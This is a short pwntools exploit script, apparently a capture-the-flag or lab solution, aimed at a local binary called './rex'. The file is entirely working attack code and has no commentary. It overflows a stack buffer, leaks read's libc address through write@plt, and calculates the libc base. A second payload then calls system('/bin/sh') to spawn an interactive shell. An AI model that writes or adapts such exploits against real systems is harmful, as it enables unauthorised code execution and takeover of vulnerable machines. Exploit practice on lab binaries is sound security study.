from pwn import * 

p = process("./rex")

write_plt = 0x804830c
read_got = 0x804961c
main = 0x804841d

read_offset = 0xe5620
system_offset = 0x3cd10
bin_offset =  0x17b8cf

payload = "a"*0x8c
payload += p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)

pause()
p.sendline(payload)

rcv = u32(p.recv(4))

libc = rcv - read_offset
system = libc+system_offset
bin = libc+bin_offset

log.info("addr : "+hex(libc))

payload2 = "b"*0x8c
payload2 += p32(system) + "c"*4 + p32(bin)
#system("/bin/sh")
p.sendline(payload2)


p.interactive()